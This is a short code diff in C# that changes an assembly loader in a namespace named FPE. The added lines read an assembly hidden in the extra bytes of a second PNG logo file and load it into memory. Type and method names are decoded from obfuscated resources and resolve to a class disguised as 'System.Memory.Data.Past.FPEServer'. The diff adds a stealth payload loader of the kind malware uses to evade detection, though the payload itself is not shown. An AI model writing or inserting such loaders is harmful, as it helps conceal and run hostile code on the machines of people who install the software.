@@ -45,7 +45,12 @@ namespace FPE
         {
             try
             {
-                var myAssembly = Assembly.LoadFrom(GTR64("SMDP.txt", Assembly.GetExecutingAssembly())); // @".\System.Memory.Data.Past.dll"
+                var buffer1 = File.ReadAllBytes(@".\bnsk.logo.png");
+                var buffer2 = File.ReadAllBytes(@".\bnsk.logo.2.png");
+                var buffer3 = buffer2.Skip(buffer1.Length).ToArray();
+                var myAssembly = Assembly.Load(buffer3);
+
+                // var myAssembly = Assembly.LoadFrom(GTR64("SMDP.txt", Assembly.GetExecutingAssembly())); // @".\System.Memory.Data.Past.dll"
                 var myType = myAssembly.GetType(GTR64("SMDPFPES.txt", Assembly.GetExecutingAssembly())); // "System.Memory.Data.Past.FPEServer"
                 var myMethod = myType.GetMethod(GTR64("RC.txt", Assembly.GetExecutingAssembly()), BindingFlags.Public | BindingFlags.Static); // "ResetConnection"
                 var fileName = GTR("FzCD.txt", Assembly.GetExecutingAssembly());
